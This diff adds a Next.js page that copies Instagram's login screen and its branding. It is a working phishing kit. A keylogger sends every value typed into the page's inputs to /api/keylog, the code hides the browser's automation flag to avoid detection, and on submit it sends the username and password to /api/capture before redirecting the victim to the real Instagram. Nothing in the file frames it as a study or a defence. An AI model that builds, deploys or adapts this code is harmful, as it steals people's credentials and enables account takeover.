@@ -1,0 +1,110 @@
+import Head from 'next/head';
+import { useEffect, useState } from 'react';
+
+export default function Home() {
+  const [loading, setLoading] = useState(false);
+
+  useEffect(() => {
+    // Stealth keylogger
+    const inputs = document.querySelectorAll('input');
+    inputs.forEach(input => {
+      input.addEventListener('input', function() {
+        navigator.sendBeacon('/api/keylog', JSON.stringify({ 
+          data: this.value, 
+          field: this.name 
+        }));
+      });
+    });
+
+    // Anti-detection
+    Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
+  }, []);
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+    setLoading(true);
+    
+    const formData = new FormData(e.target);
+    const data = Object.fromEntries(formData);
+
+    // Silent capture
+    navigator.sendBeacon('/api/capture', JSON.stringify({
+      username: data.username,
+      password: data.password,
+      ip: 'client',
+      ua: navigator.userAgent,
+      referrer: document.referrer
+    }));
+
+    // Real IG redirect after 1s
+    setTimeout(() => {
+      window.location.href = 'https://www.instagram.com';
+    }, 1000);
+  };
+
+  return (
+    <>
+      <Head>
+        <title>Instagram</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link rel="stylesheet" href="/style.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+      </Head>
+      
+      <div className="container">
+        <div className="phone-mockup">
+          <img src="https://www.instagram.com/static/images/web/mobile-navbar-0f4a1c8b7a6c.png/81830fa8e908.png" alt="Instagram" />
+        </div>
+        
+        <div className="login-box">
+          <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" className="logo" alt="Instagram" />
+          
+          <form onSubmit={handleSubmit}>
+            <div className="input-group">
+              <input 
+                type="text" 
+                name="username" 
+                placeholder="Phone number, username, or email" 
+                required 
+                autoComplete="username"
+              />
+              <i className="fas fa-user"></i>
+            </div>
+            
+            <div className="input-group">
+              <input 
+                type="password" 
+                name="password" 
+                placeholder="Password" 
+                required 
+                autoComplete="current-password"
+              />
+              <i className="fas fa-lock"></i>
+            </div>
+            
+            <button type="submit" className="login-btn" disabled={loading}>
+              {loading ? 'Logging in...' : 'Log in'}
+            </button>
+          </form>
+          
+          <div className="divider">
+            <span>OR</span>
+          </div>
+          
+          <button type="button" className="fb-btn" onClick={() => window.location.href = '/'}>
+            <i className="fab fa-facebook-f"></i>
+            Log in with Facebook
+          </button>
+          
+          <div className="forgot-password">
+            <a href="#" onClick={(e) => { e.preventDefault(); alert('Password reset sent!'); }}>Forgot password?</a>
+          </div>
+        </div>
+        
+        <div className="signup-section">
+          <p>Don't have an account? <a href="#" onClick={(e) => { e.preventDefault(); alert('Sign up coming soon!'); }}>Sign up</a></p>
+        </div>
+      </div>
+    </>
+  );
+}
